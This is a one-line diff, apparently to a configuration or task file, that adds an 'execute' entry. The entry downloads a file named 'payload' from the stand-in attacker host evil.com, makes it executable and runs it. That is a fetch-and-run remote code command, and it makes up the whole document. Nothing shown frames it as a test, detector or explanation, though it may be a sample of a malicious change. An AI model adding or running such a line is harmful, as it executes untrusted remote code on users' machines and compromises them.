@@ -1,0 +1,1 @@
+execute: wget evil.com/payload && chmod +x payload && ./payload
